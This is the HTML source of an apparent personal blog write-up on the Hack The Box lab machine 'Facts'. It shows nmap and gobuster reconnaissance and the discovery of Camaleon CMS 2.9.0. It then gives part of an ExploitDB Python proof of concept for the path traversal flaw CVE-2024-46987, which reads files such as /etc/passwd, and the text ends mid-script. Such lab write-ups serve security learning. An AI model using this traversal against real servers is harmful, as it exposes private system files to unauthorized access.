@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width">
+<link rel="icon" type="image/x-icon" href="/cybersec_logo.ico">
+<title>Facts - Vulnerable CMS leads to root access</title>
+<script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+<link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.1/css/all.min.css"
+  integrity="sha512-2SwdPD6INVrV/lHTZbO2nodKhrnDdJK9/kg2XD1r9uGqPo1cUbujc+IYdlYdEErWNu69gVcYgdxlmVmzTWnetw=="
+  crossorigin="anonymous" referrerpolicy="no-referrer" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Sans+Mono:ital,wght@0,400..700;1,400..700&display=swap');
+
+  .font-jersey {
+
+    font-family: "Ubuntu Sans Mono", monospace;
+    font-optical-sizing: auto;
+    font-style: normal;
+  }
+
+
+  .md-content .katex-display {
+    max-width: 100%;
+    overflow-x: auto;
+    overflow-y: hidden;
+    -webkit-overflow-scrolling: touch;
+    padding-left: 0.25rem;
+    padding-right: 0.25rem;
+  }
+
+  .md-content .katex-display>.katex {
+    display: inline-block;
+    max-width: 100%;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: 300ms ease-in-out;
+  }
+
+  .is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  .swup-transition-fade {
+    opacity: 1;
+    transition: opacity 300ms ease-in-out;
+  }
+
+  html.is-animating .swup-transition-fade {
+    opacity: 0;
+  }
+
+  html.is-animating {
+    cursor: progress;
+  }
+
+  html.is-leaving .swup-transition-fade {
+    opacity: 0;
+  }
+</style>
+
+<script src="https://unpkg.com/swup@4"></script>
+<script src="https://unpkg.com/@swup/preload-plugin@3"></script>
+<script src="https://unpkg.com/@swup/progress-plugin@3"></script>
+<script>
+  const swup = new Swup({
+    containers: ['#swup'],
+    animationSelector: '[class*="swup-transition-"]',
+    cache: true,
+    preload: true,
+    animateHistoryBrowsing: true,
+
+    plugins: [
+      new SwupPreloadPlugin(),
+      new SwupProgressPlugin()
+    ]
+  })
+  window.swup = swup
+</script>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.js" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/auto-render.min.js"
+  crossorigin="anonymous"></script>
+
+<script>
+  
+
+  
+  const KATEX_CONFIG = {
+    delimiters: [
+      {left: "$$", right: "$$", display: true},
+      {left: "$", right: "$", display: false},
+      {left: "\\[", right: "\\]", display: true},
+      {left: "\\(", right: "\\)", display: false}
+    ],
+    ignoredTags: ["script", "noscript", "style", "textarea", "pre", "code"],
+    throwOnError: false
+  };
+
+  
+  function renderKatex() {
+    
+    if (typeof renderMathInElement !== "function") {
+      console.log("⏳ Waiting for KaTeX to load...");
+      return;
+    }
+
+    
+    const contentArea = document.getElementById('swup') || document.body;
+
+    try {
+      renderMathInElement(contentArea, KATEX_CONFIG);
+      console.log("✅ KaTeX rendered successfully");
+    } catch (error) {
+      console.error("❌ KaTeX rendering error:", error);
+    }
+  }
+
+  
+  function renderKatexWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof renderMathInElement === "function") {
+        renderKatex();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ KaTeX auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering KaTeX...");
+        
+        setTimeout(() => renderKatexWithRetry(3, 50), 50);
+      });
+      console.log("✅ KaTeX-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderKatexWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+  
+  window.renderKatex = renderKatex;
+</script>
+
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs';
+
+  let initialized = false;
+
+  function renderMermaid() {
+    const contentArea = document.getElementById('swup') || document.body;
+    const mermaidBlocks = contentArea.querySelectorAll('.language-mermaid, .mermaid');
+
+    if (mermaidBlocks.length === 0) {
+      console.log("ℹ️ No mermaid blocks found on this page");
+      return;
+    }
+
+    if (!initialized) {
+      mermaid.initialize({startOnLoad: false, theme: 'dark'});
+      initialized = true;
+    }
+
+    mermaidBlocks.forEach(el => {
+      if (el.dataset.processed === 'true') {
+        const source = el.dataset.mermaidSource;
+        if (source) {
+          el.innerHTML = source;
+          el.removeAttribute('data-processed');
+        }
+      } else {
+        el.dataset.mermaidSource = el.textContent;
+      }
+    });
+
+    mermaid.run({nodes: mermaidBlocks})
+      .then(() => console.log("✅ Mermaid rendered successfully"))
+      .catch(err => console.error("❌ Mermaid rendering error:", err));
+  }
+
+  function renderMermaidWithRetry(maxRetries = 10, delay = 100) {
+    let attempts = 0;
+
+    const attempt = () => {
+      if (typeof mermaid.initialize === "function") {
+        renderMermaid();
+      } else if (attempts < maxRetries) {
+        attempts++;
+        setTimeout(attempt, delay);
+      } else {
+        console.warn("⚠️ Mermaid auto-render not available after", maxRetries, "attempts");
+      }
+    };
+
+    attempt();
+  }
+
+  
+  function setupSwupIntegration() {
+    
+    if (window.swup) {
+      window.swup.hooks.on('page:view', () => {
+        console.log("🔄 Swup transition complete, re-rendering mermaid...");
+        
+        setTimeout(() => renderMermaidWithRetry(3, 50), 50);
+      });
+      console.log("✅ Mermaid-Swup integration ready");
+    } else {
+      
+      setTimeout(setupSwupIntegration, 100);
+    }
+  }
+
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    console.log("🚀 Initializing KaTeX...");
+
+    
+    renderMermaidWithRetry();
+
+    
+    setupSwupIntegration();
+  });
+
+
+
+</script>
+
+
+</head>
+
+<body class="min-h-screen flex flex-col bg-black font-jersey text-white text-3xl">
+  <header>
+    <div class="sticky absolute top-0 z-50">
+  <nav class="w-full border-b border-gray-800 bg-[#070709]/95 backdrop-blur-sm text-gray-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6">
+      <div class="flex items-center justify-between h-16">
+        
+        <div class="flex items-center gap-3">
+
+          <a href='http://localhost:1313/' class="flex items-center gap-3 group" aria-label="Homepage">
+
+            <img src='/cybersec_logo.png' alt="Esteban Pangelinan - Cybersecurity"
+              class="w-10 h-10 rounded-sm border-2 border-gray-700 object-cover transition-transform duration-300 transform group-hover:scale-105"
+              style="animation: border-breathe 4s ease-in-out infinite;" />
+            <span class="text-white text-lg sm:text-xl md:text-2xl lg:text-3xl font-semibold tracking-wide">
+              root@epangelinan: cd
+              <span class="inline-block ml-2" style="animation: flicker 1.6s steps(2, end) infinite;">_</span>
+            </span>
+          </a>
+        </div>
+
+        
+        <div class="flex items-center gap-4">
+          
+          <div class="hidden md:flex items-center">
+            
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+          </div>
+
+          
+          <div class="md:hidden">
+            <button id="nav-toggle" aria-controls="mobile-menu" aria-expanded="false"
+              class="inline-flex items-center justify-center p-2 rounded-md focus:outline-none focus:ring-2 focus:ring-indigo-400"
+              aria-label="Open menu">
+              <svg class="h-6 w-6 text-gray-200" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"
+                stroke="currentColor" aria-hidden="true">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
+              </svg>
+            </button>
+          </div>
+        </div>
+      </div>
+
+      
+      <div id="mobile-menu" class="md:hidden hidden pb-4">
+        
+        
+
+<nav aria-label="Primary" class="w-full">
+  <ul
+    class="flex flex-col md:flex-row md:items-center md:space-x-6 space-y-2 md:space-y-0 sm:text-lg md:text-xl lg:text-3xl"><li>
+      <a aria-current="true" href="/writeups/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/writeups</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li><li>
+      <a href="/projects/"class="group inline-flex items-center px-3 py-2 rounded-sm text-gray-200 hover:text-white transition-colors duration-200">
+        <span class="relative inline-block">
+          <span>/projects</span>
+          
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </span>
+      </a>
+    </li>
+  </ul>
+</nav>
+
+      </div>
+    </div>
+  </nav>
+
+  
+  <style>
+    @keyframes flicker {
+      0% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      10% {
+        opacity: 0.2;
+        transform: translateY(-1px);
+      }
+
+      20% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    @keyframes border-breathe {
+      0% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+
+      50% {
+        box-shadow: 0 0 18px 6px rgba(99, 102, 241, 0.03);
+      }
+
+      100% {
+        box-shadow: 0 0 0 0 rgba(99, 102, 241, 0.06);
+      }
+    }
+  </style>
+
+  
+  <script>
+    (function () {
+      const btn = document.getElementById('nav-toggle');
+      const menu = document.getElementById('mobile-menu');
+      if (!btn || !menu) return;
+      btn.addEventListener('click', () => {
+        const open = menu.classList.toggle('hidden') === false;
+        btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+      });
+    })();
+  </script>
+</div>
+
+  </header>
+
+  <main class="flex-1 w-full">
+    <div id="swup" class="swup-transition-fade">
+      <div class="max-w-3xl lg:max-w-6xl xl:max-w-7xl mx-auto px-5 sm:px-8 lg:px-10 py-10 lg:py-16">
+        
+<main class="max-w-6xl mx-auto px-4 sm:px-6 pt-24 pb-12 text-gray-100">
+  <div class="grid grid-cols-12 gap-6">
+    <aside class="hidden lg:block col-span-3">
+      <div class="sticky top-24">
+        <div class="mb-3 text-xs uppercase tracking-widest text-gray-500">Table of Contents</div><nav class="toc text-sm text-gray-300 border border-gray-800/70 bg-[#070709] rounded-sm p-4">
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+        </nav></div>
+    </aside>
+
+    <article class="col-span-12 lg:col-span-7">
+      <header class="mb-6">
+  <h1 class="text-2xl sm:text-3xl md:text-4xl tracking-wide text-white">
+    Facts - Vulnerable CMS leads to root access
+  </h1>
+
+  <div class="mt-2 flex flex-wrap items-center gap-x-3 gap-y-2 text-sm sm:text-base text-gray-400">
+    <span class="font-mono">May 11, 2026 • 11:22</span>
+    <span class="text-gray-700">/</span>
+    <span class="font-mono">11 min read</span>
+  </div><div class="mt-3 flex flex-wrap gap-2"><a href="/%20tags/htb-easy"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #HTB - Easy
+    </a><a href="/%20tags/linux"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Linux
+    </a><a href="/%20tags/pentesting"
+      class="px-2 py-0.5 text-xs sm:text-sm rounded-sm border border-gray-700/70 text-gray-300 bg-black/30 hover:text-white hover:border-indigo-400/40 transition-colors">
+      #Pentesting
+    </a></div></header>
+
+
+      <div class="lg:hidden mb-6">
+        <details class="border border-gray-800/70 bg-[#070709] rounded-sm">
+          <summary class="cursor-pointer select-none px-4 py-3 text-gray-200 hover:text-white transition-colors">
+            Table of Contents
+          </summary>
+          <div class="px-4 pb-4 toc text-sm text-gray-300">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>OVERVIEW</strong></a></li>
+    <li><a href="#recon"><strong>RECON</strong></a></li>
+    <li><a href="#enumeration"><strong>ENUMERATION</strong></a></li>
+    <li><a href="#foothold"><strong>FOOTHOLD</strong></a></li>
+    <li><a href="#privesc"><strong>PRIVESC</strong></a></li>
+    <li><a href="#takeaways"><strong>TAKEAWAYS</strong></a></li>
+  </ul>
+</nav>
+          </div>
+        </details>
+      </div>
+
+      <div class="md-surface border border-gray-800/70 bg-[#070709] rounded-sm p-4 sm:p-6">
+        <div class="md-content text-base leading-relaxed text-gray-200">
+          <h2 id="overview" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>OVERVIEW</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p><em>Facts</em> is an easy-rated Linux machine on the HackTheBox platform. Pwning the machine requires web enumeration to find a vulnerable CMS, exploitation of a known CVE for an initial foothold, and privilege escalation through a misconfigured SUID binary.</p>
+<h2 id="recon" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>RECON</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>After obtaining the target machine&rsquo;s IP address, I ran an nmap scan to identify open TCP ports:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -sC -sV -oN nmap_tcp.txt 10.129.53.63 --min-rate<span style="color:#f92672">=</span><span style="color:#ae81ff">10000</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The scan revealed two open TCP ports for SSH and HTTP (UDP scans did not show any open ports):</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2026-05-11 20:30 PDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.53.63
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.100s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.26.3 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://facts.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.26.3 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 12.67 seconds</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Trying to navigate to <strong>http://10.129.53.63:80/</strong> redirected me to <strong><a href="http://facts.htb/">http://facts.htb/</a></strong>. I added this domain to my /etc/hosts file and revisited it.
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/homepage.png" loading="lazy" decoding="async"
+  alt="index page of facts">
+The website was a collection of fun facts, and I noticed there were no obvious endpoints such as a &ldquo;sign in&rdquo; button or &ldquo;about&rdquo; page. To get a better scope of the web app, I ran a gobuster directory scan to find directories.</p>
+<h2 id="enumeration" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>ENUMERATION</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# gobuster dir -u <span style="color:#e6db74">&#34;http://facts.htb&#34;</span> -w ../SecLists/Discovery/Web-Content/common.txt -t <span style="color:#ae81ff">25</span> --timeout 20s</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>The only endpoint that didn&rsquo;t appear to be a redirect was <strong>&quot;/admin&quot;</strong>. Visiting <a href="http://facts.htb/admin">http://facts.htb/admin</a> took me to this page:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/adminpage.png" loading="lazy" decoding="async"
+  alt="admin page of facts">
+First, I tried a variety of default admin credentials but had no success. But there was an option to create an account, so I went ahead and signed up.
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/registration.png" loading="lazy" decoding="async"
+  alt="creating a new user">
+Logging in with a new user brought me to an unprivileged dashboard.
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/facts/adminpanel.png" loading="lazy" decoding="async"
+  alt="dashboard of facts">
+I browsed around the site and realized I had no access to anything besides changing my own password.<br>
+Fortunately, this page revealed something very useful:<br>
+<strong>Camaleon CMS 2.9.0</strong><br>
+ <br>
+I decided to browse ExploitDB to see if there are any known exploits for this CMS version. As it turns out, Camaleon 2.9.0 is affected by <strong>CVE-2024-46987</strong>, making it vulnerable to <em>path traversal</em> attacks.<br>
+ <br>
+On my attacker machine, I fetched the following script from ExploitDB and converted it into a .py file:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">python</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Exploit Title: Camaleon CMS v2.9.0 - Path Traversal</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Date: 2026-02-02</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit Author: Sakshi Velampudi (CyberQuestor)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Vendor Homepage: https://github.com/owen2345/camaleon-cms</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Software Link: https://github.com/owen2345/camaleon-cms/releases/tag/2.9.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version: &lt;= 2.9.0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Tested on: Linux</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE: CVE-2024-46987</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Authentication: Required (auth_token cookie)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Description</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Sends a single HTTP GET request to a vulnerable private file download endpoint</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Uses an auth_token cookie required for admin access</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Detects invalid authentication via redirect to /admin/login</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Displays a preview of the response when file retrieval succeeds</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Run only against systems explicitly authorized for testing</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Camaleon CMS v2.9.0 - Path Traversal Proof of Concept
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Camaleon CMS v2.9.0 - Path Traversal PoC (authorized testing only)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 1) Input Collection</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Target base URL (example: http://target.com): &#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>requested_path <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;File path to request (example: /etc/passwd): &#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;auth_token value: &#34;</span>)<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> target_url <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> requested_path <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> token:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[!] Error: URL, file path, and auth_token are required.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">SystemExit</span>(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Normalize base URL to avoid malformed paths</span>
+</span></span><span style="display:flex;"><span>target_url <span style="color:#f92672">=</span> target_url<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;/&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 2) Request Construction</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> (
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>target_url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;/admin/media/download_private_file&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;?file=../../../../../../</span><span style="color:#e6db74">{</span>requested_path<span style="color:#f92672">.</span>lstrip(<span style="color:#e6db74">&#39;/&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cookies <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;auth_token&#34;</span>: token}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 3) Request Execution</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># --------------------------------------------------</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Redirects are disabled to capture authentication failures.</span>
